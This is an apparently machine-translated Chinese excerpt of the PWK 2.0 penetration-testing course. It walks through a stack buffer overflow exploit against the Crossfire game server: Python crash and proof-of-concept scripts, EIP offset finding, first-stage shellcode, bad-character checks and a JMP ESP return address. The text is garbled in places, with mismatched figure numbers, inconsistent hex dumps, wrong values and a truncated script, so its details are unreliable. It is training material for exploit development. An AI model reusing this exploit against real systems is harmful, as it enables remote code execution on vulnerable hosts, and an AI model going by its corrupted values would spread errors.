
```python
#!/usr/bin/python
import socket

host = "10.11.0.128"

crash = "\x41" * 4379

buffer = "\x11Isetup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print("[*]Payload Sent !!")
```

### 列表 367 - 使 Crossfire 崩溃的原型验证代码

注意，我们的变量变量开头结尾需要十六进制值，以及 `"setup sound"` 字符串，应用程序才会崩溃。

我们的初始原型验证代码构建了一个包含 `"setup sound"` 命令的恶意缓冲区，连接到端口 `13327` 远程服务并发送缓冲区。

要让 Crossfire 崩溃，我们可以使用 `python:` 运行我们的第一个原型验证：

### 列表 368 - 在 Kali 中运行原型验证代码

运行脚本后，调试器显示错误信息，清楚地指示栈命令中存在内存损坏，即缓冲区溢出条件：

![](img/f99f528ca9845f4c256ce54e882b1345_398_0.png)

图 225：指示缓冲区溢出的崩溃

点击 OK 按钮，我们发现 `EIP` 寄存器已被我们的缓冲区覆盖。

PWK 2.0

Copyright © Offensive Security Ltd. All rights reserved.

## 12.2.1.2 练习

- 1. 使用你收到的凭据登录你的专用 Linux 客户端。
- 2. 在你的 Kali 机器上重新创建使 Crossfire 服务器崩溃的原型验证代码。
- 3. 将调试器附加到 Crossfire 服务器，针对你的 Linux 客户端重放漏洞，并确认 `EIP` 寄存器已被恶意缓冲区覆盖。

## 12.3 控制 EIP

我们的下一个任务是识别缓冲区中的哪四个字节最终覆盖了有漏洞的返回地址，以便控制 `EIP` 寄存器。我们将使用 Metasploit `msf-pattern-script` 创建一个唯一的缓冲区字符串：

```
kali@kali:~$ msf-pattern-create -l 4367046
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa6Aa7Aa8Aa9Aa0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac
8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af5Af6
```

通过将我们的原始缓冲区替换为这个新的唯一模式，我们正在用以下字节覆盖 `EIP`：

![](img/f99f528ca9845f4c256ce54e882b1345_399_0.png)

将此值传递给 Metasploit `msf-pattern-offset` 脚本将显示你特定字节的缓冲区偏移量：

```
kali@kali:~$ msf-pattern-offset -q 4367046
[*] Exact match at offset 4368
```

为了确认此偏移量，我们将更新原型验证中的 `crash` 变量，用 `"B"` 字符干净地覆盖 `EIP`。

```python
crash = "\x41" * 4368 + "B" * 4 + "C" * 7
```

### 列表 371 - 控制 EIP 寄存器

### 12.3.1.1 练习

- 1. 确定覆盖栈返回地址所需的崩溃偏移量。
- 2. 更新你的独立脚本以确保偏移量是正确的。

## 12.4 为我们的 Shellcode 寻找空间

接下来，我们必须找到在崩溃时是否有任何寄存器指向我们的缓冲区。这一步至关重要，它允许我们随后尝试识别可以将执行流重定向到我们缓冲区的 JMP 或 CALL 指令。

我们注意到 `ESP` 寄存器（图 227）指向缓冲区的末，只留下了七字节的 shellcode。然而，无法无法缓冲区大小来获得更多空间，即使是一个字节也无法正确覆盖 `EIP`。

![](img/f99f528ca9845f4c256ce54e882b1345_400_0.png)

PWK 2.0

Copyright © Offensive Security Ltd. All rights reserved.

# 攻击性安全 (OFFENSIVE SECURITY)

Kali Linux 渗透测试 2.0

仔细观察崩溃时寄存器的状态（图 227）可以发现更多选项。`EAX` 寄存器似乎指向我们缓冲区的开头，包括 `'setup sound'` 字符串。`EAX` 直接指向开头的这一可能会影响我们跳转到 `EAX` 所指的缓冲区的能力，因为我们会在先执行 `'setup sound'` 的机器码。这最可能导致崩溃并使利用失败。

进一步检查 `'setup sound'` 字符串生成的实际机器码：

| eax | edx |
| :--- | :--- |
| 0x73 | 0x65 |
| 0x12 | 0x70 |
| 0x14 | 0x73 |
| 0x18 | 0x64 |
| 0x1c | 0x30 |
| 0x1f | 0x31 |
| 0x22 | 0x32 |
| 0x25 | 0x33 |
| 0x28 | 0x34 |
| 0x2b | 0x35 |

图 228：'setup sound' 生成的指令

有趣的是，'setup' 前两个字母 (`0x73` 和 `0x65`) 翻译为跳转到缓冲区附近的跳转。后两个字母 (`0xf4` 和 `0x75`) 翻译为一个不同的跳转。这些跳转似乎都会导致 `EAX` 崩溃。但这并不是一个优雅的解决方案。继续分析，`ESP` 指向缓冲区末尾，这给了我们几字节 shellcode 可用。我们可以尝试有限的空间创建第一阶段 shellcode。与其使用实际的反向 shell，不如使用第一阶段来对齐 `EAX` 寄存器，使其指向 `'setup sound'` 字符串之后的缓冲区并跳转到该位置。为了实现这一点，我们的第一阶段需要增加 `EAX` 的值 `12` (`0xc`)。这可以使用 `ADD` 指令完成并跳转到 `EAX` 所指的内存。

PWK 2.0

Copyright © Offensive Security Ltd. All rights reserved.

# 攻击性安全 渗透测试 2.0

# 数据转储 (Data Dump)

```
73 65 74 75 20 20 7f 65 64 24 40 41 31 30 41 61 setup_sound a0 1 2 3 4 5
31 41 31 32 41 31 31 33 41 31 31 34 41 31 31 35 a5 6 7 8 9
36 41 31 37 41 31 31 38 41 31 31 39 41 31 31 40 a7 8 9 0 1 2
32 41 31 40 41 31 31 41 41 31 31 42 41 31 31 43 b2 3 4 5 6 7
22 41 31 38 41 31 31 36 41 31 31 40 41 31 31 41 a7 8 9 0 1 2
62 41 31 39 41 31 31 42 41 31 31 43 41 31 31 43 67 c2 3 4 5 6 7 8
32 41 31 33 41 31 31 35 41 31 31 36 41 31 31 37 63 89 d8 e9 e0 e1 e2 e3
63 41 31 34 41 31 31 34 41 31 31 35 41 31 31 36 64 d1 2 3 4 5
64 41 31 34 41 31 31 35 41 31 31 36 41 31 31 37 d3 4 5 6 7 8
39 41 31 35 41 31 31 39 41 31 31 40 41 31 31 41 89 d8 e9 e0 e1 e2 e3
34 41 31 36 41 31 31 37 41 31 31 38 41 31 31 39 69 f0 f1 f2 f3 f4 f5
35 41 31 36 41 31 31 37 41 31 31 38 41 31 31 36 a5 a6 a7 a8 a9
```

图 29：调整 `EAX` 的字节数

# 使用 Kali Linux 2.0 进行渗透测试

### 列表 373 - 添加第一阶段有效负载

在运行更新后的概念验证代码后，我们可以验证 `EIP` 已被四个 `B` (`1x42`) 覆盖，并且我们的第一阶段 shellcode 位于 `ESP` 寄存器指向的内存地址：

![](img/f99f528ca9845f4c256ce54e882b1345_403_0.png)

图 230: 验证 `EIP` 指向第一阶段 shellcode

## 12.5 检查坏字符 (Bad Characters)

为了发现任何可能破坏溢出或腐败我们 shellcode 的坏字符，我们可以使用与缓冲区溢出方法中相同的方法。

我们在缓冲区中发送了从 `00` 到 `0FF` 范围的字符，并监控这些字符在被应用程序处理后，在内存中是否有任何一个被篡改、错乱、丢弃或更改。

在多次运行概念验证并每次排除一个坏字符后，我们得到了 Crossfire 异常的最终坏字符列表，看起来只有 `\x00` 和 `\x20`。

### 12.5.1.1 练习

- 1. 使用 `msf-nasm_shell` 生成第一阶段 shellcode 所需的操作码。

## 12.6 寻找返回地址

- 2. 识别不能包含在负载和返回地址中的坏字符。

作为最后一步，我们需要找到一个有效的汇编指令，将代码执行重定向到 `ESP` 寄存器指向的内存位置。调试器带有一组插件，其中之一是 `OpcodeSearcher`。

| 起地址 | 结束地址 | 权限 | 名称 |
| --- | --- | --- | --- |
| 0x0000000008480000 | 0x0000000008480000 | r-x | /usr/games/crossfire/bin/crossfire |
| 0x0000000008440000 | 0x0000000008440000 | r-x | /usr/games/crossfire/bin/crossfire |
| 0x0000000008470000 | 0x0000000008470000 | r-x | [heap] |
| 0x0000000008460000 | 0x0000000008460000 | r-- | /lib/i386-linux-gnu/libnss_files-2.24.so |
| 0x00000000087a0000 | 0x00000000087a0000 | r-- | /lib/i386-linux-gnu/libnss_files-2.24.so |
| 0x0000000008750000 | 0x0000000008750000 | r-- | /lib/i386-linux-gnu/libnss_files-2.24.so |
| 0x00000000087d0000 | 0x00000000087d0000 | rw- | |
| 0x00000000084d0000 | 0x00000000084d0000 | r-- | |

图 231: 用于 EDB 的 OpcodeSearch 插件

使用此插件，我们可以轻松在 crossfire 应用代码段映射的内存区域中搜索 JMP 指令或等效指令：

![](img/f99f528ca9845f4c256ce54e882b1345_405_0.png)

## 操作码搜索 (Opcode Search)

| 搜索区域： | 起地址 | 结束地址 | 权限 |
|---|---|---|---|
| 0x0000000014000000 | 0x0000000014000000 | 0x0000000014007000 | /usr/games/crossfire/bin/crossfire |
| 0x0000000014007000 | 0x0000000014007000 | 0x000000001400f000 | /usr/games/crossfire/bin/crossfire |
| 0x0000000093000000 | 0x0000000093000000 | 0x0000000093007000 | [heap] |
| 0x0000000074000000 | 0x0000000074000000 | 0x000000007400f000 | /lib/i386-linux-gnu/libnss_files-2.24.so |
| 0x0000000074500000 | 0x0000000074500000 | 0x000000007450f000 | /lib/i386-linux-gnu/libnss_files-2.24.so |
| 0x0000000074600000 | 0x0000000074600000 | 0x000000007460f000 | /lib/i386-linux-gnu/libnss_files-2.24.so |
| 0x0000000074d00000 | 0x0000000074d00000 | 0x0000000074d0f000 | /lib/i386-linux-gnu/libnss_files-2.24.so |
| 要搜索的 | 跳转等效于 | ESP -> EIP |
|---|---|---|
| 0x000000000813bd | call esp | |
| 0x000000000813c8 | call esp | |
| 0x000000000813596 | jmp esp |

图 232: 使用 EDB 寻找汇编指令 (0x8345)

我们选择使用调试器中的 JMP 指令 (`0x81396`)。通过覆盖偏移、返回地址和第一阶段的以下概念验证：

```python
#!/usr/bin/python
import socket
host = "10.110.128"
padding = "\x41" * 436
eip = "\x96\x45\x13\x08"
first_stage = "\x83\x00\xe9\x00"
buffer = "\x11setup" + padding + eip + first_stage + "\x90"
s = socket.socket(socket.AF_INET,
```

### 列表 374 - 添加返回地址

## 攻击性安全 (OFFENSIVE SECURITY)

重启应用并再次附加调试器。与其让 Crossfire 进程运行，不如使用 EDB 在 JMP 指令处设置断点。这将帮助我们确认 `EIP` 已正确覆盖。

## 断点管理器 (Breakpoint Manager)

![](img/f99f528ca9845f4c256ce54e882b1345_406.png)

设置断点后，我们可以按照计划运行概念验证，调试器应该在 JMP 指令处停止。

![](img/f99f528ca9845f4c256ce54e882b1345_406.png)

断点已命中，我们需要单步进入 JMP 指令并到达我们的第一阶段 shellcode。

| esp | eax, esp |
|---|---|
| bfff:f0d3 c0 00 | lea eax, [esp] |
| bfff:f0d3 e7 e0 | |
| bfff:f0d0 ad cf d8 14 | add [eax+0x14],ec |
| bfff:f0d0 00 00 01 00 | add [eax],al |
| bfff:f0d0 00 00 30 00 | sub [eax],0x3000000 |
| bfff:f0d0 ff d8 | or dl,al |
| bfff:f0d0 0b 22 | mov [eax],eax |
| bfff:f0d2 11 00 | add eax,al |
| bfff:f0d2 ff e | jmp eax |
| 寄存器 | |
|---|---|
| b7d0a0a6 0073 "setup" AAAAAAAA |
| b7d0a0a6 "setup" AAAAAAAA |
| b7d0a0a6 0073 "setup" AAAAAAAA |
| 41414141 | |
| 41414141 | |
| 41414141 | |
| 41414141 | |

在第一条指令后，`EAX` 寄存器现在指向我们控制的 `"setup"` 字符串之后的缓冲区。

图 235: 进入内存中的第一阶段 shellcode

## 数据转储 (Data Dump)

| | | | | | | | | | | | | | | | | setup |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| b7d0:0da6 00 00 11 28 73 65 74 75 70 20 73 6f 75 64 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
